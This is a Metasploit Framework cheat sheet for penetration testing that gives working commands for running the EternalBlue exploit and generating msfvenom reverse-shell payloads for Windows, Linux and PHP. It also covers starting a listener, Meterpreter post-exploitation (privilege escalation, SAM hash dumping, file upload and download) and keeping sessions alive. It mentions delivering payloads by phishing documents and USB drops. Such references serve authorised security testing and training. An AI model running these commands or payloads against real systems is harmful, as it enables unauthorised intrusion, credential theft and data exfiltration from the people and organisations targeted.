# Metasploit Reference

Practical reference for the Metasploit Framework — exploit selection/execution, payload generation, and post-exploitation via Meterpreter.

## Table of Contents

1. [Core Workflow](#1-core-workflow)
2. [msfvenom — Payload Generation](#2-msfvenom--payload-generation)
3. [Meterpreter — Post-Exploitation](#3-meterpreter--post-exploitation)
4. [Session Management](#4-session-management)
5. [Field Notes](#5-field-notes)

---

## 1. Core Workflow

```
msfconsole
search ms17-010                                    # find modules matching a CVE/vuln name
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST 10.10.10.50
set LPORT 4444
run
```

`search` accepts CVE numbers, vuln names, or platform/type filters (`search type:exploit platform:windows smb`) — narrowing by platform early saves time scrolling through irrelevant modules.

## 2. msfvenom — Payload Generation

Standalone payload generator, useful when you need a binary/script to deliver outside of a Metasploit module directly (e.g. via a file upload vuln, a phishing doc, a USB drop):

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f elf > shell.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f raw > shell.php
```

Pair with a listener before delivering the payload:

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.50
set LPORT 4444
run
```

## 3. Meterpreter — Post-Exploitation

Once a session lands:

```
sysinfo                # target OS/arch details
getuid                 # current privilege context
getsystem              # attempt automatic privilege escalation to SYSTEM (Windows)
hashdump               # dump local SAM hashes
shell                   # drop to a native cmd/bash shell inside the session
upload local.exe C:\\Windows\\Temp\\        # push a file to the target
download C:\\Users\\victim\\file.txt ./     # pull a file from the target
```

## 4. Session Management

```
background              # return to msfconsole without killing the session
sessions -l              # list all active sessions
sessions -i 1            # re-enter session 1
```

## 5. Field Notes

**`getsystem` is worth trying first, but it's not magic.** It only works against a handful of known Windows privilege-escalation techniques (token impersonation tricks, mostly) — when it fails silently, that's the signal to move to manual enumeration (`winPEAS`, checking service permissions, scheduled tasks) rather than assuming the box simply can't be escalated.

**`background` instead of closing a session.** A session that gets killed (Ctrl+C, closing the shell) is usually gone for good unless persistence was set up first. `background` drops you back to `msfconsole` while keeping the session alive in `sessions -l` — the safe way to go do something else (run another exploit, pivot) without losing the foothold you already have.
